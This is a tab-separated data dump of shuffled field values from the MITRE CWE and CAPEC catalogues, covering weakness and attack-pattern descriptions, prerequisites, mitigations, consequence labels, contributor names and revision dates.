8396	35	MITRE
25336	92	Exploit
8494	28	CWE Content Team
17942	51	2017-01-12
15964	81	Confidentiality
12386	62	updated Common_Consequences
9113	28	CWE Content Team
23761	28	CWE Content Team
8368	35	MITRE
7077	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships
5602	103	Primary
7160	31	1000
18869	62	updated Potential_Mitigations, References
16050	35	MITRE
24641	86	http://fort-knox.org/thesis.pdf
20323	43	Simple
11816	39	2012-10-30
5842	40	The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.
19271	45	Base
18160	81	Confidentiality
24451	62	updated Relationships
20081	46	This weakness can lead to a wide variety of resultant weaknesses, depending on the behavior of the exposed method. It can apply to any number of technologies and approaches, such as ActiveX controls, Java functions, IOCTLs, and so on.             The exposure can occur in a few different ways:                             1) The function/method was never intended to be exposed to outside actors.                2) The function/method was only intended to be accessible to a limited set of actors, such as Internet-based access from a single web site.
13298	21	PLOVER
8608	31	1000
21193	23	The software does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the software.
11355	100	The MITRE Corporation
12097	35	MITRE
15095	102	ChildOf
21304	35	MITRE
21325	55	CAPEC Content Team
6405	40	The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.
9486	79	Authorization
7363	61	Draft
8997	50	Configuration: Disable iFrames in the Web browser.
22819	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
10113	35	MITRE
11440	101	CAPEC Content Team
17293	78	Low
25172	35	MITRE
10201	46	When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.             The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.
11583	35	MITRE
11426	26	Architecture and Design
15076	103	Primary
5775	39	2014-07-30
19142	31	699
12383	31	1000
12858	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
12516	62	updated Time_of_Introduction
13531	28	CWE Content Team
7600	35	MITRE
7533	103	Primary
7616	39	2017-11-08
12010	39	2019-06-20
23289	56	ChildOf
24203	35	MITRE
20321	101	CAPEC Content Team
8881	100	The MITRE Corporation
9184	31	1000
13304	62	updated Type
22707	63	Bypass Protection Mechanism
22131	35	MITRE
16589	54	High
14649	35	MITRE
17827	81	Integrity
14389	66	Discovering and Exploiting Named Pipe Security Flaws for Fun and Profit
22273	39	2013-02-21
18202	102	ChildOf
14011	85	191
25409	55	CAPEC Content Team
10146	81	Other
19030	28	CWE Content Team
18857	62	updated Relationships, Taxonomy_Mappings
9412	33	OWASP
7911	59	Updated Attack_Phases
17033	55	CAPEC Content Team
8219	69	Draft
16932	56	ChildOf
13149	103	Primary
9841	23	An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security. In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from "Restful Privilege Escalation" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.
9279	35	Cigital
19390	35	MITRE
12066	101	CAPEC Content Team
14324	31	699
7467	46	This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.   While the interpetation of "large number of parent classes" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.
18546	43	Simple
19683	28	CWE Content Team
7760	28	CWE Content Team
10338	35	MITRE
7332	70	UTF-8 decoder capability and stress test
18166	62	added/updated white box definitions
22577	43	Simple
11499	97	Subvert Code-signing Facilities
7597	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20026	31	699
11541	35	MITRE
9476	23	Nonces should be used for the present occasion and only once.
10819	28	CWE Content Team
16048	62	updated Potential_Mitigations
25235	56	ChildOf
9175	62	updated Relationships
19026	35	MITRE
22368	35	MITRE
17575	28	CWE Content Team
13495	100	The MITRE Corporation
24345	63	Reduce Maintainability
16441	39	2009-03-10
16662	67	Medium
9071	74	3
13858	62	updated Relationships, Taxonomy_Mappings
15331	26	Implementation
9178	39	2008-10-14
10587	31	1000
10841	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
6281	27	To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.
20909	28	CWE Content Team
11981	47	Modify Data
16136	35	MITRE
24834	69	Draft
24415	28	CWE Content Team
25285	33	Adobe
19152	54	High
12522	62	updated Description
9682	69	Incomplete
18972	62	updated Potential_Mitigations
24897	35	MITRE
11132	62	updated References, Relationships
14003	103	Primary
14537	62	updated Common_Consequences
8997	54	Medium
20609	23	Two separate operations in a product cause the product to behave differently in a way that is observable to an attacker and reveals security-relevant information about the internal state of the product, such as whether a particular operation was successful or not.
22221	56	ChildOf
20276	26	Implementation
13684	28	CWE Content Team
18872	62	updated Relationships
25003	101	CAPEC Content Team
22004	79	Confidentiality
15426	39	2011-06-01
7152	101	CAPEC Content Team
5729	28	CWE Content Team
20887	57	Primary
22932	39	2014-07-30
19159	35	MITRE
8482	45	Base
21318	39	2011-06-01
12289	97	Replace Binaries
8639	28	CWE Content Team
14164	55	CAPEC Content Team
24820	35	MITRE
16371	91	Implementation
5993	81	Availability
23097	97	Capture Credentials via Keylogger
20588	104	833
11185	62	updated Potential_Mitigations, Time_of_Introduction
11534	35	MITRE
6379	92	Exploit
20015	91	Implementation
7218	77	Manual Static Analysis - Binary or Bytecode
14678	81	Integrity
10530	56	ChildOf
18333	31	1000
9570	28	CWE Content Team
8917	31	699
17389	28	CWE Content Team
6164	96	2011-03-22
9029	81	Integrity
15514	62	updated References, Relationships
17223	53	The MITRE Corporation
24586	62	updated Type
10485	39	2008-07-01
18007	39	2011-06-01
22091	62	updated Related_Attack_Patterns
25325	35	MITRE
24396	51	2014-06-23
13276	28	CWE Content Team
6539	39	2008-07-01
20801	76	2019-04-04
6892	31	1000
16633	69	Draft
21615	35	MITRE
17024	77	Manual Static Analysis - Binary or Bytecode
17234	28	CWE Content Team
23516	42	For later PHP versions, reference uploaded files using the $HTTP_POST_FILES or $_FILES variables, and use is_uploaded_file() or move_uploaded_file() to ensure that you are dealing with an uploaded file.
23041	68	This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly.
17501	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns
5606	42	Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.
14789	28	CWE Content Team
24583	62	updated Common_Consequences
21084	35	MITRE
6323	32	The Open Web Application Security Project (OWASP)
22509	39	2008-09-08
15953	81	Other
22389	79	Authentication
12910	76	2017-01-09
16423	63	DoS: Resource Consumption (Memory)
20857	48	04
14584	49	2007
6535	31	699
7649	62	updated Common_Consequences
11039	62	updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
23778	50	Implementation: Utilize a .onion domain with Tor support
6010	35	MITRE
8830	81	Integrity
10765	79	Confidentiality
17779	42	Clone all mutable data before passing it into an external function . This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class.
8315	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
9309	69	Draft
10849	21	CLASP
20294	81	Integrity
25394	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
14783	30	Amit Klein
5853	35	MITRE
23103	28	CWE Content Team
7332	36	http://www.cl.cam.ac.uk/%7Emgk25/ucs/examples/UTF-8-test.txt
25393	44	High
16695	62	updated Potential_Mitigations
19454	56	ChildOf
9157	28	CWE Content Team
8077	56	CanPrecede
9177	62	updated Detection_Factors
16902	28	CWE Content Team
9346	40	The targeted program runs with elevated OS privileges.
16855	62	updated Relationships, Taxonomy_Mappings
6763	66	Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm
21414	62	updated Time_of_Introduction
23228	28	CWE Content Team
9027	50	Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.
16753	50	Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.
7403	28	CWE Content Team
12582	28	CWE Content Team
7552	88	Insufficient Encapsulation of Machine-Dependent Functionality
11424	28	CWE Content Team
22287	94	Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.
22463	62	updated Name
14017	62	updated Common_Consequences, Description, Other_Notes
11187	89	Detailed
9071	92	Exploit
18492	72	Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool.
8617	86	http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html
25191	62	updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings, White_Box_Definitions
23575	76	2017-08-04
21334	35	MITRE
12901	72	When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
17027	28	CWE Content Team
19417	35	MITRE
24444	39	2009-10-29
12554	28	CWE Content Team
11883	39	2014-02-18
7161	39	2012-05-11
17225	28	CWE Content Team
19917	79	Integrity
8575	54	Low
17967	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings, Type
16207	39	2014-07-30
18637	99	SANS Software Security Institute
13050	21	PLOVER
17077	90	Language-Independent
9191	35	Cigital
5752	39	2017-11-08
6884	90	Perl
19579	63	Bypass Protection Mechanism
13613	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Potential_Mitigations, Relationships
10299	56	CanPrecede
24826	39	2008-07-01
13976	88	Race Condition within a Thread
22088	62	updated Related_Attack_Patterns
23773	79	Availability
12647	44	SOAR Partial
17366	79	Confidentiality
7157	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
25091	35	MITRE
23462	39	2012-05-11
22346	35	MITRE
5826	51	2014-06-23
14502	94	Run Arbitrary Code
11864	63	Bypass Protection Mechanism
16291	62	updated Alternate_Terms, Applicable_Platforms, Description, Name, Potential_Mitigations, Relationships
5912	103	Primary
6250	26	Architecture and Design
5614	39	2012-05-11
11889	104	561
9523	50	Implementation: Perform input validation for all remote content.
12259	97	Influence Perception of Authority
18307	91	Architecture and Design
24864	28	CWE Content Team
21399	35	MITRE
14703	55	CAPEC Content Team
16571	28	CWE Content Team
22883	104	401
11970	33	Peter Hannay
21999	35	MITRE
13322	23	The documentation does not sufficiently describe the techniques      that are used for error handling, exception processing, or similar      mechanisms.
12935	104	370
18954	92	Experiment
17554	26	Architecture and Design
14257	23	When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it.
6971	35	MITRE
21569	50	Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.
9637	80	The adversary requires strong inter-personal and communication skills.
19962	62	updated Time_of_Introduction
5865	97	Flash Injection
7713	88	Insufficient Session Expiration
13153	39	2014-07-30
22659	21	Anonymous Tool Vendor (under NDA)
20605	21	Anonymous Tool Vendor (under NDA)
25442	33	OWASP
11069	39	2013-02-21
18894	28	CWE Content Team
9694	39	2017-11-08
22963	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Resources_Required, Solutions_and_Mitigations
22237	39	2008-08-15
14453	35	MITRE
7914	80	The attacker must know how to make use of these smudges.
9047	62	updated Relationships
15445	35	MITRE
12398	104	86
17873	39	2017-11-08
23886	39	2017-05-03
17228	28	CWE Content Team
7114	33	Jeremiah Grossman
10067	92	Experiment
16186	28	CWE Content Team
21047	35	MITRE
17868	88	Insufficient Isolation of System-Dependent Functions
11420	63	Read Files or Directories
10195	39	2011-06-27
11785	28	CWE Content Team
6587	53	The MITRE Corporation
23257	56	ChildOf
6760	63	Modify Application Data
12083	35	Cigital
7214	39	2014-07-30
8422	21	PLOVER
14721	26	Architecture and Design
7143	39	2011-09-13
20380	39	2009-12-28
12093	28	CWE Content Team
17722	39	2008-09-08
22729	31	1000
19232	28	CWE Content Team
10360	28	CWE Content Team
14695	104	124
25051	28	CWE Content Team
19725	49	2017
23725	39	2010-06-21
6270	35	MITRE
19694	53	The MITRE Corporation
23139	39	2017-11-08
7022	35	MITRE
21895	56	ChildOf
8380	51	2014-06-23
20657	63	Read Application Data
18944	35	MITRE
21296	79	Availability
13291	62	updated Description
8480	91	Implementation
10705	28	CWE Content Team
8219	45	Variant
23493	35	MITRE
9846	101	CAPEC Content Team
11213	35	MITRE
12919	100	The MITRE Corporation
23859	35	MITRE
11804	28	CWE Content Team
6379	95	[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.
8635	102	ChildOf
24848	79	Integrity
7697	69	Incomplete
11822	100	The MITRE Corporation
18955	88	Information Exposure Through Caching
8647	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
17159	57	Indirect
7484	63	Execute Unauthorized Code or Commands
8172	28	Eric Dalci
24844	77	Architecture or Design Review
9162	66	Insufficient Anti-automation
13781	42	When sensitive information is sent, use of the POST method is recommended (e.g. registration form).
21977	62	added/updated white box definitions
8482	43	Simple
22689	35	MITRE
19285	39	2019-06-20
18979	55	CAPEC Content Team
8516	35	MITRE
20105	39	2010-02-16
13214	56	ChildOf
20600	39	2014-07-30
7462	39	2011-06-27
18602	47	Execute Unauthorized Commands
16752	61	Draft
8768	62	updated Demonstrative_Examples, Likelihood_of_Exploit, Taxonomy_Mappings
9115	49	2003
16387	28	CWE Content Team
7396	28	CWE Content Team
16500	35	MITRE
16542	31	1000
20928	39	2011-06-01
19067	23	A software system that accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
9732	69	Draft
11045	35	MITRE
19141	39	2012-10-30
22451	44	SOAR Partial
6991	43	Simple
20579	100	The MITRE Corporation
18137	40	This attack targets most widely deployed feature rich email applications, including web based email programs.
16544	74	2
22718	71	2006
24920	35	MITRE
24101	95	Understand the password recovery mechanism and how it works.
19311	67	High
17624	91	Testing
21616	35	MITRE
11910	35	MITRE
10363	100	The MITRE Corporation
20627	35	MITRE
6113	62	updated Potential_Mitigations
23054	35	MITRE
20994	28	CWE Content Team
13701	90	Language-Independent
5970	97	Replace Trusted Executable
19182	23	An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. Specifically, if the permissions for users and groups are not properly assigned and allow access to the registry keys used to store the configuration information for a service, then an adversary could change settings defining the path to the executable and cause a malicious binary to be executed.
24459	103	Primary
11628	34	Since early validation errors usually arise from improperly implemented defensive mechanisms, it is likely that these will be introduced more frequently as secure programming becomes implemented more widely.
8868	62	updated Name, Relationships
11180	32	Acunetix
16163	92	Exploit
5699	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
22698	35	MITRE
7988	35	MITRE
21068	39	2011-09-13
23776	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
25116	62	updated Relationships
23352	39	2008-07-01
17292	43	Simple
17083	101	CAPEC Content Team
12751	42	Recheck the resource after the use call to verify that the action was taken appropriately.
24214	62	updated Relationships
18158	33	Ilya Sutskever
15905	39	2011-06-01
12657	22	11
20521	39	2019-01-03
8493	97	Malware-Directed Internal Reconnaissance
22794	28	CWE Content Team
23156	51	2014-06-23
14664	49	2010
14403	59	Updated Description, Taxonomy_Mappings
8514	31	1000
22554	56	ChildOf
15237	63	Other
17734	63	Other
15442	39	2009-05-27
12730	56	ChildOf
22496	79	Confidentiality
17750	62	updated Common_Consequences
8118	69	Incomplete
10944	45	Base
8087	39	2008-09-08
20609	90	Language-Independent
15256	59	Updated Attack_Phases
22298	101	CAPEC Content Team
12984	28	CWE Content Team
11692	92	Exploit
18540	39	2009-07-27
10306	56	ChildOf
22299	62	updated Relationships
7188	39	2019-01-03
21975	28	CWE Content Team
9940	50	Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.
15140	28	CWE Content Team
12074	100	The MITRE Corporation
8432	45	Base
9667	80	The attacker may write a script to defeat the input filtering mechanism.
11273	63	Alter Execution Logic
13364	39	2011-06-01
18012	79	Availability
19690	62	updated Demonstrative_Examples, Name
11750	61	Draft
5935	59	Updated References, Related_Attack_Patterns
15959	72	An attacker could read and modify data for which they do not have permissions to access directly.
16082	39	2014-07-30
19801	62	updated Relationships
18615	35	MITRE
19406	35	MITRE
23563	62	updated Relationships
20177	40	The application uses environment variables.
21361	40	Software's input validation or filtering must not detect and block presence of additional malicious command.
13891	28	CWE Content Team
22036	30	Rama Moorthy
18621	80	Advanced knowledge of the design of the system.
15198	90	C++
14815	26	Implementation
15818	62	updated Demonstrative_Examples, Potential_Mitigations
17063	39	2011-06-27
21477	28	CWE Content Team
9899	62	updated Applicable_Platforms, Taxonomy_Mappings
12413	47	Gain Privileges
21991	95	[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.
6630	35	MITRE
6769	103	Primary
7531	52	Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
13955	39	2017-11-08
11069	35	MITRE
25427	35	MITRE
23298	28	CWE Content Team
13003	76	2018-07-31
8250	50	Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
14015	79	Access Control
17924	62	updated Name
19817	62	updated Common_Consequences
8645	62	updated Demonstrative_Examples, Potential_Mitigations
21283	39	2009-12-28
21243	35	MITRE
17266	49	1996
19101	39	2019-06-20
14517	81	Access Control
21270	35	MITRE
12844	69	Incomplete
16537	39	2019-01-03
7955	21	CWE Content Team
11433	46	When providing functionality to an external party, it is important that the software behaves in accordance with the details specified. When requirements of nuances are not documented, the functionality may produce unintended behaviors for the caller, possibly leading to an exploitable state.
23435	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source Code Quality Analyzer                                                                     Cost effective for partial coverage:                                                                           Warning Flags                            Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
21094	28	CWE Content Team
15307	63	Read Application Data
22758	25	Low
19610	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.                Individuals should avoid complying with suspicious requests.
21637	104	149
7097	79	Authorization
23893	42	Many IDEs and static analysis products will detect this problem.
20578	56	ChildOf
22604	63	Execute Unauthorized Code or Commands
14675	97	Leverage Alternate Encoding
16507	28	CWE Content Team
23752	35	MITRE
21481	62	updated Relationships
21653	28	CWE Content Team
7566	79	Confidentiality
10553	35	MITRE
12557	28	CWE Content Team
10455	39	2012-10-30
15745	54	Low
7335	42	Variables that may be subject to race conditions should be locked before the switch statement starts and only unlocked after the statement ends.
22690	28	CWE Content Team
21323	62	updated Relationships
16397	28	CWE Content Team
20010	28	CWE Content Team
23184	88	Non-exit on Failed Initialization
19971	35	MITRE
8487	28	CWE Content Team
9433	39	2014-07-30
5724	28	CWE Content Team
14720	56	CanPrecede
19301	35	MITRE
10502	28	CWE Content Team
19470	104	363
22663	35	MITRE
9727	62	updated Name
24720	62	updated Relationships
13220	50	Applications should insure that the content of the file is consistent with format it is expecting, and not depend solely on the file extension.
5737	39	2017-11-08
9924	59	Updated Related_Attack_Patterns
8174	35	MITRE
23352	28	Sean Eidemiller
9276	81	Non-Repudiation
7818	55	CAPEC Content Team
24059	53	The MITRE Corporation
25381	77	Automated Static Analysis - Binary or Bytecode
19438	39	2008-09-08
23968	88	Modules with Circular Dependencies
20813	60	11
18580	56	ChildOf
16539	102	ChildOf
20242	39	2017-11-08
9973	101	CAPEC Content Team
12580	23	An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a "layer" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: <parser1> --> <input validator> --> <parser2>. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.
18772	35	MITRE
17412	21	Evgeny Lebanidze
24284	91	Architecture and Design
18281	63	DoS: Crash, Exit, or Restart
23619	35	MITRE
10482	43	Simple
22814	35	Cigital
17277	39	2010-06-21
20919	89	Detailed
11724	28	Eric Dalci
17524	101	CAPEC Content Team
11176	35	Cigital
11496	28	CWE Content Team
18356	40	The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.
8930	21	PLOVER
17237	28	Eric Dalci
8148	62	updated Relationships
8553	47	Execute Unauthorized Commands
8222	71	2007
25325	28	CWE Content Team
5774	35	MITRE
12840	31	699
9297	69	Draft
12930	76	2017-08-04
7509	81	Confidentiality
22899	56	ChildOf
10111	40	Access to the system during the development phase to alter and/or modify software and hardware components. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.
19470	88	Race Condition Enabling Link Following
20234	101	CAPEC Content Team
22187	45	Base
22649	35	MITRE
10440	23	The UI has multiple interpretations of user input but does not prompt the user when it selects the less secure interpretation.
18111	62	converted from Compound_Element to Weakness
16772	28	CWE Content Team
19186	103	Primary
8110	39	2009-07-27
8761	62	updated Relationships
10456	28	CWE Content Team
6583	26	Implementation
15446	91	Operation
16112	88	Use of Wrong Operator in String Comparison
19856	102	CanAlsoBe
23501	63	Modify Memory
16122	35	Cigital
18903	35	MITRE
6345	31	1000
19802	46	This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
12220	95	[Exploit the security weaknesses in the standard libraries] The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.
20571	31	1000
9937	96	2018-07-02
7007	55	CAPEC Content Team
14586	86	http://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#dcl
8195	26	Architecture and Design
14091	81	Non-Repudiation
11580	26	Implementation
21896	39	2008-09-08
23038	62	updated Demonstrative_Examples, References
14324	56	ChildOf
24288	39	2009-05-27
11597	32	Defense Advanced Research Projects Agency (DARPA)
14887	51	2014-06-23
19803	28	CWE Content Team
7106	35	MITRE
11640	81	Confidentiality
21444	62	updated Description, Relationships, Relationship_Notes, Taxonomy_Mappings
17485	39	2012-10-30
24339	43	Simple
19438	35	MITRE
22403	85	237
19851	56	ChildOf
20680	76	2019-09-30
22161	78	Medium
12990	62	updated Name, Relationships
6437	101	CAPEC Content Team
8211	45	Class
24672	53	The MITRE Corporation
13441	35	Cigital
8083	97	Manipulating Hidden Fields
10028	28	CWE Content Team
14564	39	2014-02-18
24045	35	MITRE
24560	69	Incomplete
20653	76	2019-09-30
15001	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required
17803	40	Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.
5668	35	MITRE
22994	101	CAPEC Content Team
23008	76	2018-07-31
6342	63	Reduce Maintainability
15896	39	2019-01-03
22197	39	2009-07-27
8784	62	updated References
15608	60	25
19604	31	1000
6842	26	Implementation
7020	63	Unexpected State
11771	39	2012-10-30
15321	39	2009-12-28
16680	62	updated Detection_Factors, Relationships
8189	35	MITRE
24994	101	CAPEC Content Team
19827	56	ChildOf
20772	56	ChildOf
14593	35	Cigital
6835	28	CWE Content Team
19778	21	CWE Content Team
14930	81	Confidentiality
23351	40	The target applications (or target application threads) must share data between themselves.
15045	85	645
8157	31	1000
8532	62	updated Time_of_Introduction
6813	88	Use of Prohibited Code
15718	39	2014-07-30
21388	100	The MITRE Corporation
23041	42	Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]
6333	42	Consider adhering to the following rules when allocating and managing an application's memory:                                                                  Double check that your buffer is as large as you specify.                         When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.                         Check buffer boundaries if accessing the buffer in a loop and make sure you are not in danger of writing past the allocated space.                         If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.
15811	39	2019-06-20
10728	39	2019-09-19
9366	59	Updated Example_Instances
12279	35	MITRE
19450	62	updated Common_Consequences
9167	35	MITRE
10462	62	updated Common_Consequences
9046	35	MITRE
18876	35	MITRE
5807	50	File extensions should be checked to see if non-visible characters are being included.
6726	67	Medium
6154	28	CWE Content Team
13317	72	An attacker could package untrusted data with trusted data to bypass protection mechanisms to gain access to and possibly modify sensitive data.
16962	102	ChildOf
18093	39	2018-03-27
5624	50	Countermeasures have been proposed for both disassociation flooding and RF jamming, however these countermeasures are not standardized and would need to be supported on both the retransmission device and the handset in order to be effective. Commercial products are not currently available that support jamming countermeasures for Wi-Fi.
19709	56	ChildOf
8714	28	CWE Content Team
20274	39	2010-12-13
24534	21	Evgeny Lebanidze
16612	28	CWE Content Team
12296	40	HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding
14906	35	MITRE
12972	23	The software collects personally identifiable information about a human user or the user's activities, but the software accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the software.
11777	104	293
13779	28	CWE Content Team
7815	28	CWE Content Team
12604	62	updated Other_Notes, Theoretical_Notes
8305	62	updated Type
21945	62	updated Description, Potential_Mitigations
18225	39	2008-08-15
15087	100	The MITRE Corporation
21179	39	2012-10-30
22810	28	CWE Content Team
7718	62	updated Relationships, Taxonomy_Mappings
20383	35	MITRE
6116	62	updated Common_Consequences, Potential_Mitigations, References, Time_of_Introduction
6453	63	Other
7027	23	Environmental variables may contain sensitive information about a remote server.
15790	103	Primary
23905	79	Confidentiality
17805	62	updated Relationships
9458	62	updated Common_Consequences
20202	62	updated Common_Consequences
8075	60	04
21661	86	http://www.securityfocus.com/archive/1/401682
22204	101	CAPEC Content Team
12884	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
7675	62	updated Applicable_Platforms, Taxonomy_Mappings
9891	32	http://www.iacr.org/archive/ches2004/31560428/31560428.pdf
18947	31	1000
24823	62	updated Relationships
6226	77	Dynamic Analysis with Manual Results Interpretation
18878	39	2008-07-01
13368	26	Architecture and Design
17969	47	Modify Data
